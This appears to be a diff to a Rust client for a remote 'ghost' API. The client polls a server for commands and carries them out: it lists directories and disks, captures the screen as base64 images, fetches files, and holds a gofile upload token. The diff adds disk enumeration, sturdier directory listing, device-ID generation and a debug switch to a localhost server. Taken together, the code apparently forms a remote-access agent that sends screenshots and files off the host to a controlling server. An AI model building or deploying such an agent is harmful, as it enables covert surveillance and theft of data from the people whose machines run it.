@@ -4,7 +4,7 @@ use std::path::Path;
 use std::time::Duration;
 use tokio::time::sleep;
 use serde::{Deserialize, Serialize};
-use sysinfo::{System, SystemExt}; // SystemExt dibutuhkan di sysinfo 0.29
+use sysinfo::{System, SystemExt, DiskExt}; // Tambahkan DiskExt
 use reqwest::Client;
 use screenshots::Screen;
 use uuid::Uuid;
@@ -19,12 +19,8 @@ struct Config {
     heartbeat_interval_ms: u64,
     poll_interval_ms: u64,
     gofile_token: String,
-    #[serde(default = "default_uuid")]
+    #[serde(default)]
     device_id: String,
-}
-
-fn default_uuid() -> String {
-    Uuid::new_v4().to_string()
 }
 
 // --- PAYLOAD STRUCTS ---
@@ -118,20 +114,32 @@ async fn main() {
 
 fn load_or_create_config() -> Config {
     let path = "config.json";
-    if Path::new(path).exists() {
+    let (mut cfg, is_new) = if Path::new(path).exists() {
         let content = fs::read_to_string(path).unwrap();
-        let mut cfg: Config = serde_json::from_str(&content).unwrap_or_else(|_| {
+        (serde_json::from_str::<Config>(&content).unwrap_or_else(|_| {
             println!("⚠️ Config rusak, reset...");
             create_default_config(path)
-        });
-        
-        if cfg.device_id.is_empty() {
-            cfg.device_id = Uuid::new_v4().to_string();
-            save_config(path, &cfg);
-        }
-        return cfg;
-    } 
-    create_default_config(path)
+        }), false)
+    } else {
+        (create_default_config(path), true)
+    };
+
+    // Auto-generate Device ID if missing (and it's not a newly created config which already has one)
+    if !is_new && cfg.device_id.is_empty() {
+        cfg.device_id = Uuid::new_v4().to_string();
+        save_config(path, &cfg);
+        println!("🆔 Generated and saved new Device ID: {}", cfg.device_id);
+    }
+
+    // 🚀 AUTO-ADAPT: Switch to localhost if in development (debug mode)
+    if cfg!(debug_assertions) {
+        println!("🛠️  [DEV MODE] Auto-switching API to http://localhost:3000/api/ghost");
+        cfg.api_url = "http://localhost:3000/api/ghost".to_string();
+    } else {
+        println!("🌐 [RELEASE MODE] Connecting to: {}", cfg.api_url);
+    }
+    
+    cfg
 }
 
 fn create_default_config(path: &str) -> Config {
@@ -178,29 +186,42 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
     match cmd.command.as_str() {
         "LS" => {
             let path_str = cmd.args.unwrap_or_else(|| "C:\\".to_string());
-            match fs::read_dir(&path_str) {
-                Ok(entries) => {
-                    let mut files: Vec<FileEntry> = Vec::new();
-                    for entry in entries {
-                        if let Ok(entry) = entry {
-                            let meta = entry.metadata().unwrap();
-                            files.push(FileEntry {
-                                name: entry.file_name().to_string_lossy().to_string(),
-                                kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
-                                size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
-                            });
+            let path = Path::new(&path_str);
+            
+            if !path.exists() {
+                status = "ERROR".to_string();
+                response_data = Some(serde_json::json!({ "message": "Path not found" }));
+            } else {
+                match fs::read_dir(path) {
+                    Ok(entries) => {
+                        let mut files: Vec<FileEntry> = Vec::new();
+                        for entry in entries {
+                            if let Ok(entry) = entry {
+                                let name = entry.file_name().to_string_lossy().to_string();
+                                // Gunakan metadata() dengan aman
+                                if let Ok(meta) = entry.metadata() {
+                                    files.push(FileEntry {
+                                        name,
+                                        kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
+                                        size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
+                                    });
+                                } else {
+                                    // Jika metadata gagal (misal file sistem khusus), masukkan sebagai unknown
+                                    files.push(FileEntry { name, kind: "unknown".to_string(), size: "?".to_string() });
+                                }
+                            }
                         }
+                        files.sort_by(|a, b| {
+                            if a.kind == b.kind { a.name.cmp(&b.name) } 
+                            else if a.kind == "dir" { std::cmp::Ordering::Less } 
+                            else { std::cmp::Ordering::Greater }
+                        });
+                        response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                     }
-                    files.sort_by(|a, b| {
-                        if a.kind == b.kind { a.name.cmp(&b.name) } 
-                        else if a.kind == "dir" { std::cmp::Ordering::Less } 
-                        else { std::cmp::Ordering::Greater }
-                    });
-                    response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
-                }
-                Err(e) => {
-                    status = "ERROR".to_string();
-                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
+                    Err(e) => {
+                        status = "ERROR".to_string();
+                        response_data = Some(serde_json::json!({ "message": format!("Access Denied: {}", e) }));
+                    }
                 }
             }
         },
@@ -209,12 +230,9 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
             if let Some(screen) = screens.first() {
                 match screen.capture() {
                     Ok(image) => {
-                        // Fix: Menggunakan cursor dan crate image untuk write ke buffer PNG
                         let mut cursor = std::io::Cursor::new(Vec::new());
-                        // ImageOutputFormat perlu 'image' crate
                         let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
                         
-                        // Fix: Menggunakan base64 engine baru
                         let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
                         response_data = Some(serde_json::json!({ "image": b64 }));
                     },
@@ -224,6 +242,23 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
                     }
                 }
             }
+        },
+        "LIST_DISKS" => {
+            let mut sys = System::new_all();
+            sys.refresh_disks_list();
+            sys.refresh_disks();
+            
+            let mut disks: Vec<serde_json::Value> = Vec::new();
+            for disk in sys.disks() {
+                disks.push(serde_json::json!({
+                    "name": disk.name().to_string_lossy().to_string(),
+                    "mount_point": disk.mount_point().to_string_lossy().to_string(),
+                    "total_space": format_size(disk.total_space()),
+                    "available_space": format_size(disk.available_space()),
+                    "file_system": String::from_utf8_lossy(disk.file_system()).to_string(),
+                }));
+            }
+            response_data = Some(serde_json::json!({ "disks": disks }));
         },
         "GET_FILE" => {
             let path_str = cmd.args.unwrap_or_default();
